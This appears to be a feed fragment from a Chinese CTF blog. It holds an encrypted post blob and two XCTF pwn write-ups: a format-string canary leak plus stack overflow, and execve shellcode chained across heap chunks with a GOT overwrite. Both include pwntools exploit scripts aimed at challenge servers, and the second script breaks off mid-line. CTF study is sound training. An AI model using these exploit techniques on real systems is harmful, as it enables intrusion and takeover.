5b0c3d6b8396c79de81fcd5d46a87ad4201c3d922079d473a4803836bfa995b419c9a34423e1a53b7a5ebbdc5e22e3d1d6461eba7133c5d0f69b551bef8c303048ff08dd70f09efebae5f5f8a0fd1fbddbb8d215839c91f57c58aac3b7c873dc9122feeba28e841936928dfe9e55bfee9b7cc9fdad2a159cf0392d938d36925da7c7aa0d35e148b37e321b76bafb8431f4dead80ffde4368208001bad420e7f7b615774c6c15749295b68302fc14ac4b0dd9091c693e51e493f03291648d59e9d2dc14cd288bc0fb44040af9d61594065fe5e2bfc5d1d0983a36846c50d5ee4d1178ed5172b05743cbab24761b94a967acde580f587cf75ee9d74480dae34366681dd86147f3cfb2006aa5b458da8ff512bd8e266a8e3d1d655b9b751806792f14559388d34de5d4eb30ff3acb64417c918d2a3e65409218b55c0cc8e683734e1fbd073d2f8cec8f3749160e521c2220b28fb2caeee0435a4d6425fb236ef18994c7e291a75b7265648f4a0f7c4ae80256eb1fc16bf9385901aca495bd15d5cfbee76f8965a6c2bea84e116030708791bcf87b61a4ca5014168ae879107327da9e4e8466fd8e6aea0edf7c46c8bb20926fd546206b7ecd2a0a87d500fe448756b74fa9544158e614631549f3f9ba0aca7aeb26bbb4e51af976c39d96fa0dacd1154790c59eb939859ce14286aad8475a692ddca7c2e6d4218c3210b90dbbcd4bd9e169b7a85bb41abd0e7c0cee937cee08fc137e41d45f07909bef64ed12ecd9c9bb1f7b4d26106fb529373edc73bae38968c636e3c9312255f964c3ade78be0ce90d949f0eb99d8c39fef06e18ced6db36185eaaed0d73416506dc3b16de445f5952e5214ecaf615beb9b81de65bdef429d3bc9bef7c13266a47d2eace4f15999ad48393b06bedd992a3df79a5b01246704381043b442007a5987c50a036600da9ad1c2e6369acce55adb6a3435a55de39d24bcac32a42e06ea06c8ceab2b45979685d204145f03e6c088dd0fc358bf3b61417aa95d7b43cbf3ab491bc74813dc63f0c64398c78b5b7acdabdb5a5bf8b4fd403fc26eff44e9de2e901986c3bfb9e9cfe7352099a3b1fdc356e94320d439d14ce12b5b132190d5ad9e88be12d0433d063099b87c58cb62e48847f528543f5631169b7b54a0f313b67996df7f029a13e8247125a32c2a82b2c78854629de80c3d3d20054ee401413cc8eea65ce9e032107ae0273706567acb84433bce0c6c084979cc2cb90dd18a66be53d5f3c6e1178943947934bedda3901551547ea2758e0e47095eefd1e681a877a40f75b8ebc74b65c174932da93d4f97eb1b4a855c28dc0a8515cf53f92d07908875e634fb24881afcfb1bb0c6b27a22adec838b8d1237d93eeaf0e97cb10e16be63b342bf434eae51b515c7fdb2121b1c2b0a10fbd31ba6cb75c5bc51dcbcc1d0b1309487a9dbfafb920a2669730f484e6f55453b09b20cf9d07f71a52429c704fcf37724352098865d4b09416889bc492bfa1817b470faf39cb37ae809c96ba5577e0acc62acd09ad91589d8422ff60645e14e55227412e4ce2d4082f1ba5daad1a06c5a4e1a6c604cfa9523c252e4b15750175e78d3adbb12c2b305e4dce893961c5413ddb64b85d2fad80aa25c45a5aacb3e5d5f6b9752b2f518add44da4ffe597cc7a2dd1dabd040b55e08da1fdae4954054abd3a6dab5eb06352917dc4b8659cd2801d82577f979f71c96ffee06c1605d4387e978df5a02d780f99b84655b2c0dfb5fb908d0aefcdbb657ca5eba34b9c835bdf193afe4c8d75af34a8cf50179495d05eebcf889023c38243c612ee20fb64091052a58b6f8e3da55693a7c075396776b8733faac1600cc8628850b669fc78dd1e1414665352310b042272f8fa370bd88ecae0c9090bda32125aa333d2a26683d6f764dc1540da6e0bcbe938017119c04a9a341cba8c1122bcb2f0654ed47988d50c0730f373c398fd4ea8c5d8bcdefc44437782fa0f2125d34c3d478a9e44279889f50c7b9d6462cd6477e606ee28e7e1405395670799207fa13bad33f2f8e7ec40a809089755b7e940b900b32e19572895c54aab98061afedd153aaec4eea2182d2b873383c4ed0267f3393b405eb6449ad01dfffdc65a96c25f4497e6f7d0db63b59a8b044465a677c4606ba7e1f6dbfdb5bfcda148c032423097a4a8e8b0d27cc43368fa5e69a90a320a56b1a30234557c217d48dabc99fdaab4b371847af495ac31c6ec943477f53a70d5d03ea1be15296273fafb5f02dfacb5dd79a27</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</title>
    <link href="https://muzibing.github.io/2020/07/19/2020.07.19%EF%BC%88138%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/19/2020.07.19（138）/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-25T03:07:52.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><blockquote><ul><li>格式化字符串的利用</li><li>金丝雀的绕过</li><li>栈的溢出</li></ul></blockquote><h3 id="font-color-navy0x01-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-分析题目font"></a> <font color="navy"><code>0x01 分析题目</code></font></h3><blockquote><p>既然题目说是个非常简单的热身的pwn，那我就简单的<b>热一下身</b></p></blockquote><h4 id="font-color-blue1file-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-maryfont"></a> <font color="blue"><code>1.file mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file mary</span><br><span class="line">mary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><h4 id="font-color-blue2checksec-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-maryfont"></a> <font color="blue"><code>2.checksec mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec mary</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过</p></blockquote><h4 id="font-color-blue3试运行程序font"><a class="markdownIt-Anchor" href="#font-color-blue3试运行程序font"></a> <font color="blue"><code>3.试运行程序</code></font></h4><p><img src="/images/138-1.png" alt></p><blockquote><p>从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。</p></blockquote><h4 id="font-color-blue4获取程序的伪代码font"><a class="markdownIt-Anchor" href="#font-color-blue4获取程序的伪代码font"></a> <font color="blue"><code>4.获取程序的伪代码</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图是程序选项为<code>1</code>时的伪代码，可以看出该模块是有栈溢出漏洞的危害</p></blockquote><p><img src="/images/138-3.png" alt></p><blockquote><p>上图是程序选项为<code>2</code>时的伪代码，可以看出该模块有格式化字符串漏洞</p></blockquote><h3 id="font-colornavy0x02-解题思路font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-解题思路font"></a> <font color="navy"><code>0x02 解题思路</code></font></h3><p>      从上文对题目的分析以后，我们可以有一种利用思路是：</p><blockquote><ol><li>通过格式化字符串漏洞将Canary泄露出来</li><li>再通过选项1的栈溢出执行shellcode</li></ol></blockquote><p>      下面我们看看怎么写exp脚本：</p><h4 id="font-color-blue1泄露canaryfont"><a class="markdownIt-Anchor" href="#font-color-blue1泄露canaryfont"></a> <font color="blue"><code>1.泄露canary</code></font></h4><p>      通过上图可以看出，我们输入的<code>AAAAAAAA</code>，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和<code>buf</code>的位置相邻，那么下面我们确定一下金丝雀的位置：</p><p><img src="/images/138-4.png" alt></p><blockquote><p>可以从上图看出，金丝雀的位置为<code>rbp-0x8</code>，因为<code>buf</code>的距离<code>rbp</code>的位置有<code>0x90</code>，所以我们可以得出<code>buf</code>距离 Canary有<code>0x88</code>，也就是<code>0x88/8=17</code>个地址单位，那么距离格式化字符串有<code>17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23</code>个单位，如下图所示：</p></blockquote><p><img src="/images/138-5.jpg" alt></p><blockquote><p>那么我们可以将格式化字符串设置为<code>%23$p</code>，下图是运行程序时输入的<code>%23$p</code>，输出结果为<code>0x2c3bceda73691600</code>，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。</p></blockquote><p><img src="/images/138-6.png" alt></p><h4 id="font-color-blue2栈溢出font"><a class="markdownIt-Anchor" href="#font-color-blue2栈溢出font"></a> <font color="blue"><code>2.栈溢出</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图中的buf可以输入的空间大小有<code>0x100</code>，而buf到ebp的距离却只有<code>0x90</code>，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图：</p></blockquote><p><img src="/images/138-7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary mary --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400464 : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary mary --string &quot;flag&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400b36 : flag</span><br></pre></td></tr></table></figure><blockquote><p>从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图：</p></blockquote><p><img src="/images/138-8.png" alt></p><blockquote><p>地址为<code>0x4008DA</code>，下面我们就可以构造exp了</p></blockquote><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 exp</code></font></h3><p><code>选项2泄露canary，选项1进行栈溢出</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">36580</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string</span><span class="params">()</span>:</span></span><br><span class="line">payload1 = <span class="string">"%23$p"</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] The value of Canary is"</span>,canary)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">(canary)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = (<span class="number">0x90</span><span class="number">-0x8</span>)*<span class="string">"a"</span> + str(p64(canary),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">8</span> + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">start()</span><br><span class="line">canary = format_string()</span><br><span class="line">overflow(canary)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="栈相关题目" scheme="https://muzibing.github.io/tags/%E6%A0%88%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Note-service2】在堆上执行shellcode</title>
    <link href="https://muzibing.github.io/2020/07/18/2020.07.18%EF%BC%88137%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/18/2020.07.18（137）/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-19T02:55:37.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基础知识font"></a> <font color="navy"><code>0x00 基础知识</code></font></h3><h4 id="font-color-blue1什么是shellcodefont"><a class="markdownIt-Anchor" href="#font-color-blue1什么是shellcodefont"></a> <font color="blue"><code>1.什么是shellcode</code></font></h4><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。 ——维基百科</p></blockquote><h4 id="font-color-blue2shellcode的c语言形式font"><a class="markdownIt-Anchor" href="#font-color-blue2shellcode的c语言形式font"></a> <font color="blue"><code>2.shellcode的C语言形式</code></font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code[<span class="number">2</span>]; </span><br><span class="line">    code[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    code[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(code[<span class="number">0</span>], code, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再将上述代码进行简化：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="font-color-blue3shellcode的汇编形式font"><a class="markdownIt-Anchor" href="#font-color-blue3shellcode的汇编形式font"></a> <font color="blue"><code>3.shellcode的汇编形式</code></font></h4><blockquote><p>将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   %rbp</span><br><span class="line">    1136:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1139:       48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">    113d:       89 7d fc                mov    %edi,-0x4(%rbp)</span><br><span class="line">    1140:       48 89 75 f0             mov    %rsi,-0x10(%rbp)</span><br><span class="line">    1144:       ba 00 00 00 00          mov    $0x0,%edx</span><br><span class="line">    1149:       be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">    114e:       48 8d 3d af 0e 00 00    lea    0xeaf(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1155:       e8 d6 fe ff ff          callq  1030 &lt;execve@plt&gt;</span><br><span class="line">    115a:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    115f:       c9                      leaveq </span><br><span class="line">    1160:       c3                      retq   </span><br><span class="line">    1161:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">    1168:       00 00 00 </span><br><span class="line">    116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><blockquote><p>rax 保存系统调用号#59，这是execve的调用号<br>rdi  保存execve的第一个参数，是&quot;/bin/sh&quot;的地址<br>rsi  是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组<br>rdx 是零，用来做execve的第三个参数<br>execve的原型是：<code>int execve(const char *filename, char *const argv[],char *const envp[]);</code></p></blockquote><p>      在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rdi,XXX  # rdi代表的是“/bin/sh”的地址</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p>这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。</p></blockquote><h4 id="font-color-blue4jmp-命令font"><a class="markdownIt-Anchor" href="#font-color-blue4jmp-命令font"></a> <font color="blue"><code>4.jmp *** 命令</code></font></h4><blockquote></blockquote><h3 id="font-color-navy0x01-解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-解题思路font"></a> <font color="navy"><code>0x01 解题思路</code></font></h3><h4 id="font-color-blue1file-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-pwnfont"></a> <font color="blue"><code>1.file pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line"></span><br><span class="line">pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以得到该文件是一个64位的ELF文件</p></blockquote><h4 id="font-color-blue2checksec-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-pwnfont"></a> <font color="blue"><code>2.checksec pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><blockquote><p>可以看出NX没有开启保护，并且<code>Has RWX segments</code>说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码：</p></blockquote><p><code>addNote函数</code></p><p><img src="/images/137-1.png" alt></p><blockquote><p>从上图中可以看出，<font color="green">程序并没有对<code>qword_2020A0[v1]</code>数组的下标进行检查，</font>从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下<code>sub_B69((__int64)qword_2020A0[v1], v2);</code>函数，如下图：</p></blockquote><p><img src="/images/137-2.png" alt></p><blockquote><p>从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分：</p><ul><li>mov eax,0x3B：5字节</li><li>mov esi,0：5字节</li><li>mov edx,0：5字节</li><li>syscall：2字节</li></ul></blockquote><p>      “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用<code>atoi()函数</code>，我们看一下第一次执行<code>atoi函数</code>的汇编：</p><p><img src="/images/137-3.png" alt></p><blockquote><p>通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。</p></blockquote><h4 id="font-color-blue3确定jmp的距离font"><a class="markdownIt-Anchor" href="#font-color-blue3确定jmp的距离font"></a> <font color="blue"><code>3.确定jmp的距离</code></font></h4><p>      上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的<code>jmp short</code>指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图：</p><p><img src="/images/137-4.png" alt></p><blockquote><p>如上图，看地址为<code>0xE94</code>和<code>0xEA0</code>处的汇编指令，都是<code>jmp short loc_ED1</code>，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为<code>0xE94</code>的指令的字节为：<code>EB 3B</code>，而地址<code>0xEA0</code>的指令的字节为：<code>EB 2F</code>，它们都是跳转到地址为<code>ED1</code>处，来计算一下是怎么跳转的：</p><ul><li><code>0xE94</code>：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1</li><li><code>0xEA0</code>：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1</li></ul><p>也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图：</p></blockquote><p><img src="/images/137-5.png" alt></p><blockquote><p>由此看来jmp short xxx中的xxx的值是<code>该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置</code>，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：<code>1+8+8+8 = 25(0x19)</code>，为什么是这样的，可以看上图的实例。</p></blockquote><h4 id="font-color-blue4确定解题思路font"><a class="markdownIt-Anchor" href="#font-color-blue4确定解题思路font"></a> <font color="blue"><code>4.确定解题思路</code></font></h4><blockquote><p>通过上述的分析，我们确定了如下的解题思路：</p><ol><li>将我们的shellcode布置在几个不同的堆块上，如下图：</li></ol><p><img src="/images/137-6.jpg" alt></p><ol start="2"><li>根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下：</li></ol><p><img src="/images/137-7.jpg" alt></p><ol start="3"><li>从上图可以看出，我们就可以写出完整的exp</li></ol></blockquote><h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span 